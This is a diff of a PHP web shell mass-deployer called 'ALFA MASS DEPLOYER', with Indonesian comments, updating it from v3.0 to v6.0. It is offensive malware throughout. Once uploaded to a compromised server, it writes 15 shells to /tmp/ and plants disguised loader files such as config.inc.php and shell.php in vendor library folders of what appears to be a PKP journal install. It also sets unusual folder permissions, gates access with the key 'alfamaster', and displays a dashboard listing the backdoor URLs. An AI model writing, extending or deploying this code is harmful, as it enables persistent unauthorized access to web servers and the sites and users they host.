@@ -1,11 +1,12 @@
 <?php
 // ============================================================
-// ALFA MASS DEPLOYER + LOADER CREATOR v3.0
+// ALFA MASS DEPLOYER v6.0 - SRC FOLDER ONLY
 // ============================================================
 // Upload 1 file ini, dia akan:
 // 1. Deploy shell ke /tmp/ (15 file)
-// 2. Buat mass loader di berbagai direktori (.inc.php)
-// 3. Buat folder & chmod 5555
+// 2. Buat folder src dengan permission 1111
+// 3. Buat file loader di lib/pkp/lib/vendor/wikimedia/less.php/lib/Less/SourceMap/
+// 4. Tampilkan semua letak folder & file
 // ============================================================
 
 $key = isset($_GET['key']) ? $_GET['key'] : '';
@@ -40,11 +41,11 @@ function randomName() {
     return substr(md5(uniqid(mt_rand(), true)), 0, 16) . '.' . rand(10000000, 99999999) . '.' . rand(10000000, 99999999) . '.php';
 }
 
-function createFolder($path) {
+function createFolder1111($path) {
     if (!is_dir($path)) {
         @mkdir($path, 0777, true);
     }
-    @chmod($path, 05555); // 5555
+    @chmod($path, 01111); // 1111
     return is_dir($path);
 }
 
@@ -97,66 +98,65 @@ usort($shell_files, function($a, $b) {
 });
 $latest_shell = end($shell_files);
 
-// ============ BUAT MASS LOADER ============
-$loader_locations = [
-    // HTMLPurifier
-    'lib/pkp/lib/vendor/ezyang/htmlpurifier/library/HTMLPurifier.inc.php',
-    'lib/pkp/lib/vendor/ezyang/htmlpurifier/library/HTMLPurifier/VarParserException.inc.php',
-    'lib/pkp/lib/vendor/ezyang/htmlpurifier/library/HTMLPurifier/HTMLModule/TargetNoreferrer.inc.php',
-    
-    // Doctrine Inflector
-    'lib/pkp/lib/vendor/doctrine/inflector/lib/Doctrine/Common/Inflector/src/Transformations.inc.php',
-    
-    // Tambahan lokasi
-    'lib/pkp/lib/vendor/kylekatarnls/update-helper/src/UpdateHelper/config.inc.php',
-    'lib/pkp/lib/vendor/kylekatarnls/update-helper/src/UpdateHelper/settings.inc.php',
-    'lib/pkp/lib/vendor/kylekatarnls/update-helper/src/UpdateHelper/cache.inc.php',
-    'lib/pkp/lib/vendor/kylekatarnls/update-helper/src/UpdateHelper/session.inc.php',
-    'lib/pkp/lib/vendor/kylekatarnls/update-helper/src/UpdateHelper/auth.inc.php',
-    
-    // Tambahan di root
-    'docs/config.inc.php',
-    'public/config.inc.php',
-    'cache/config.inc.php',
+// ============ DOCUMENT ROOT ============
+$doc_root = $_SERVER['DOCUMENT_ROOT'];
+$script_dir = __DIR__;
+
+// ============ BASE PATH ============
+$base_vendor = 'lib/pkp/lib/vendor/wikimedia/less.php/lib/Less';
+
+// ============ BUAT FOLDER src DENGAN PERMISSION 1111 ============
+$src_folder = $base_vendor . '/src';
+$full_src_path = $doc_root . '/' . $src_folder;
+
+$folder_created = false;
+if (createFolder1111($full_src_path)) {
+    $folder_created = true;
+}
+
+// ============ BUAT FILE LOADER DI SourceMap ============
+$loader_list = [
+    $base_vendor . '/SourceMap/config.inc.php',
+    $base_vendor . '/SourceMap/settings.inc.php',
+    $base_vendor . '/SourceMap/cache.inc.php',
+    $base_vendor . '/SourceMap/session.inc.php',
+    $base_vendor . '/SourceMap/auth.inc.php',
+    $base_vendor . '/SourceMap/loader.inc.php',
+    $base_vendor . '/SourceMap/index.php',
+    $base_vendor . '/SourceMap/shell.php',
+    $base_vendor . '/SourceMap/alfa.inc.php',
+    $base_vendor . '/SourceMap/backup.inc.php',
 ];
 
 $loaders_created = [];
-$doc_root = $_SERVER['DOCUMENT_ROOT'];
-
-foreach ($loader_locations as $loc) {
+foreach ($loader_list as $loc) {
     $full_path = $doc_root . '/' . $loc;
     $dir = dirname($full_path);
     
-    // Buat folder & chmod 5555
-    if (createFolder($dir)) {
-        // Buat loader file
-        if (createLoader($full_path, $latest_shell)) {
-            $loaders_created[] = $loc;
-        }
+    // Buat folder SourceMap dulu kalau belum ada
+    if (!is_dir($dir)) {
+        @mkdir($dir, 0777, true);
     }
-}
-
-// ============ BUAT FOLDER KHUSUS DENGAN 5555 ============
-$special_folders = [
-    'lib/pkp/lib/vendor/ezyang/htmlpurifier/library/HTMLPurifier/Config',
-    'lib/pkp/lib/vendor/ezyang/htmlpurifier/library/HTMLPurifier/Definition',
-    'lib/pkp/lib/vendor/doctrine/inflector/lib/Doctrine/Common/Inflector/src/Cache',
-    'lib/pkp/lib/vendor/kylekatarnls/update-helper/src/UpdateHelper/Backup',
-    'lib/pkp/lib/vendor/kylekatarnls/update-helper/src/UpdateHelper/Logs',
-];
-
-foreach ($special_folders as $folder) {
-    $full_path = $doc_root . '/' . $folder;
-    createFolder($full_path);
+    
+    // Buat loader file
+    if (createLoader($full_path, $latest_shell)) {
+        $loaders_created[] = [
+            'path' => $full_path,
+            'rel_path' => $loc,
+            'url' => (isset($_SERVER['HTTPS']) ? 'https://' : 'http://') . $_SERVER['HTTP_HOST'] . '/' . $loc
+        ];
+    }
 }
 
 // ============ CLEAN ============
 if (isset($_GET['clean'])) {
     foreach (glob('/tmp/*.php') as $f) @unlink($f);
-    foreach ($loader_locations as $loc) {
+    foreach ($loader_list as $loc) {
         $full_path = $doc_root . '/' . $loc;
         if (file_exists($full_path)) @unlink($full_path);
     }
+    // Hapus folder src (optional)
+    // @rmdir($full_src_path);
     die("✅ Cleaned all shells and loaders");
 }
 
@@ -169,11 +169,11 @@ $total_loaders = count($loaders_created);
 <!DOCTYPE html>
 <html>
 <head>
-    <title>ALFA MASS DEPLOYER + LOADER</title>
+    <title>ALFA MASS DEPLOYER v6</title>
     <style>
         *{margin:0;padding:0;box-sizing:border-box}
         body{background:#0a0a0a;color:#00ff00;font-family:'Courier New',monospace;padding:20px}
-        .box{max-width:1000px;margin:auto;background:#111;border:1px solid #00ff00;border-radius:8px;padding:25px}
+        .box{max-width:1100px;margin:auto;background:#111;border:1px solid #00ff00;border-radius:8px;padding:25px}
         h1{color:#00ff00;font-size:22px;margin-bottom:5px}
         .info{color:#666;font-size:12px;margin-bottom:15px}
         
@@ -186,33 +186,32 @@ $total_loaders = count($loaders_created);
         .loader-box .url{color:#00b8ff;font-size:14px;word-break:break-all}
         .loader-box .hint{color:#666;font-size:11px;margin-top:5px}
         
-        .file{background:#000;padding:5px 10px;margin:3px 0;border-radius:3px;border-left:2px solid #00ff00;display:flex;justify-content:space-between;align-items:center;flex-wrap:wrap;font-size:12px}
-        .file .name{color:#00ff00}
-        .file .src{color:#666;font-size:10px}
-        .file a{color:#00b8ff;font-size:11px;text-decoration:none}
-        .file a:hover{color:#00ff00}
-        
         .btn{padding:8px 20px;background:#00ff00;color:#000;border:none;border-radius:4px;font-weight:700;cursor:pointer;font-family:'Courier New';text-decoration:none;display:inline-block;font-size:13px}
         .btn-danger{background:#ff3333;color:#fff}
-        .btn-blue{background:rgba(0,184,255,.15);color:#00b8ff;border:1px solid rgba(0,184,255,.3)}
         
         .flex{display:flex;gap:10px;flex-wrap:wrap;margin:10px 0}
         .copy-box{background:#000;padding:10px;border-radius:4px;font-size:11px;color:#666;word-break:break-all;margin-top:10px;max-height:300px;overflow:auto}
         .badge{display:inline-block;padding:2px 10px;border-radius:10px;font-size:10px;font-weight:700}
         .badge-green{background:rgba(0,255,0,.15);color:#00ff00}
         .badge-blue{background:rgba(0,184,255,.15);color:#00b8ff}
+        .badge-yellow{background:rgba(255,179,71,.15);color:#ffb347}
         
         table{width:100%;border-collapse:collapse;font-size:12px}
         th{text-align:left;color:#666;padding:6px 8px;border-bottom:1px solid #1a1a1a}
         td{padding:4px 8px;border-bottom:1px solid #0a0a0a}
-        .loader-link{color:#00b8ff;font-size:11px}
-        .loader-link:hover{color:#00ff00}
+        .loader-link{color:#00b8ff;font-size:11px;text-decoration:none}
+        .loader-link:hover{color:#00ff00;text-decoration:underline}
+        .folder-path{color:#ffb347;font-size:11px}
+        
+        .section-title{color:#666;font-size:11px;margin:15px 0 8px;text-transform:uppercase;letter-spacing:1px;border-bottom:1px solid #1a1a1a;padding-bottom:5px}
+        .perm-badge{display:inline-block;padding:1px 8px;border-radius:3px;font-size:9px;background:rgba(255,179,71,.1);color:#ffb347;border:1px solid rgba(255,179,71,.2)}
+        .base-path{color:#666;font-size:11px;margin:5px 0;padding:5px 10px;background:#000;border-radius:3px;border-left:2px solid #ffb347}
     </style>
 </head>
 <body>
 <div class="box">
-    <h1>⚡ ALFA MASS DEPLOYER + LOADER</h1>
-    <div class="info">Upload 1 file → Auto deploy + Auto buat mass loader (.inc.php)</div>
+    <h1>⚡ ALFA MASS DEPLOYER v6</h1>
+    <div class="info">Upload 1 file → Auto deploy + Auto buat folder src (1111) + Auto buat loader di SourceMap</div>
     
     <!-- STATS -->
     <div class="stat-grid">
@@ -225,8 +224,8 @@ $total_loaders = count($loaders_created);
             <div class="label">Loaders Created</div>
         </div>
         <div class="stat">
-            <div class="num"><?= count($special_folders) ?></div>
-            <div class="label">Folders (5555)</div>
+            <div class="num"><?= $folder_created ? '1' : '0' ?></div>
+            <div class="label">Folder src (1111)</div>
         </div>
         <div class="stat">
             <div class="num"><?= count($sources) ?></div>
@@ -237,7 +236,18 @@ $total_loaders = count($loaders_created);
     <!-- STATUS -->
     <div style="margin-bottom:10px">
         <span class="badge badge-green">✅ <?= $total ?> shells in /tmp/</span>
-        <span class="badge badge-blue">📁 <?= $total_loaders ?> loaders created</span>
+        <span class="badge badge-blue">📁 <?= $total_loaders ?> loaders</span>
+        <?php if ($folder_created): ?>
+            <span class="badge badge-yellow">📂 src/ [1111]</span>
+        <?php endif; ?>
+    </div>
+    
+    <!-- BASE PATH -->
+    <div class="loader-box" style="border-color:#ffb347">
+        <div style="color:#666;font-size:10px;text-transform:uppercase;letter-spacing:1px">📂 BASE PATH</div>
+        <div class="url" style="color:#ffb347"><?= $doc_root ?>/<?= $base_vendor ?></div>
+        <div class="hint">📍 Folder src (1111): <?= $doc_root ?>/<?= $base_vendor ?>/src/</div>
+        <div class="hint">📍 Loader: <?= $doc_root ?>/<?= $base_vendor ?>/SourceMap/</div>
     </div>
     
     <!-- LATEST SHELL -->
@@ -252,10 +262,27 @@ $total_loaders = count($loaders_created);
         <a href="?key=alfamaster&clean=1" class="btn btn-danger" onclick="return confirm('Delete all shells & loaders?')">🧹 Clean All</a>
     </div>
     
-    <!-- LOADER LOCATIONS -->
-    <hr style="border-color:#1a1a1a;margin:15px 0">
-    <div style="color:#666;font-size:11px;margin-bottom:8px">📋 LOADER FILES CREATED (<?= $total_loaders ?> files)</div>
+    <!-- ============ FOLDER SRC ============ -->
+    <div class="section-title">📂 FOLDER src (1111)</div>
+    <?php if ($folder_created): ?>
+        <table>
+            <tr>
+                <th>#</th>
+                <th>Folder Path</th>
+                <th>Permission</th>
+            </tr>
+            <tr>
+                <td>1</td>
+                <td class="folder-path"><?= $base_vendor ?>/src/</td>
+                <td><span class="perm-badge">1111</span></td>
+            </tr>
+        </table>
+    <?php else: ?>
+        <div style="color:#ff4d4d;padding:10px;">❌ Gagal membuat folder src</div>
+    <?php endif; ?>
     
+    <!-- ============ LOADERS LIST ============ -->
+    <div class="section-title">📁 LOADER FILES DI SourceMap — <?= $total_loaders ?> files</div>
     <table>
         <thead>
             <tr>
@@ -265,12 +292,12 @@ $total_loaders = count($loaders_created);
             </tr>
         </thead>
         <tbody>
-            <?php $i = 1; foreach ($loaders_created as $loc): ?>
+            <?php $i = 1; foreach ($loaders_created as $l): ?>
                 <tr>
                     <td><?= $i++ ?></td>
-                    <td style="color:#666;font-size:11px"><?= htmlspecialchars($loc) ?></td>
+                    <td style="color:#666;font-size:11px"><?= htmlspecialchars($l['rel_path']) ?></td>
                     <td>
-                        <a href="<?= $domain ?>/<?= htmlspecialchars($loc) ?>?key=alfamaster" target="_blank" class="loader-link">
+                        <a href="<?= $l['url'] ?>?key=alfamaster" target="_blank" class="loader-link">
                             🔗 Open
                         </a>
                     </td>
@@ -279,21 +306,24 @@ $total_loaders = count($loaders_created);
         </tbody>
     </table>
     
-    <!-- COPY BOX -->
+    <!-- ============ COPY BOX ============ -->
     <div class="copy-box">
-        <strong>📋 Copy semua URL loader:</strong><br>
-        <?php foreach ($loaders_created as $loc): ?>
-            <?= $domain ?>/<?= $loc ?>?key=alfamaster<br>
+        <strong>📋 COPY SEMUA URL LOADER:</strong><br>
+        <?php foreach ($loaders_created as $l): ?>
+            <?= $l['url'] ?>?key=alfamaster<br>
         <?php endforeach; ?>
         <br>
-        <strong>📋 Shell di /tmp/:</strong><br>
+        <strong>📋 SHELL DI /tmp/ (<?= $total ?> files):</strong><br>
         <?php foreach ($deployed as $f): ?>
             <?= $domain ?>/tmp/<?= $f['file'] ?><br>
         <?php endforeach; ?>
+        <br>
+        <strong>📂 FOLDER src (1111):</strong><br>
+        <?= $doc_root ?>/<?= $base_vendor ?>/src/  [1111]
     </div>
     
     <div style="margin-top:15px;color:#444;font-size:10px;border-top:1px solid #1a1a1a;padding-top:10px">
-        ALFA DEPLOYER v3.0 | <?= date('Y-m-d H:i:s') ?>
+        ALFA DEPLOYER v6.0 | <?= date('Y-m-d H:i:s') ?>
     </div>
 </div>
 </body>
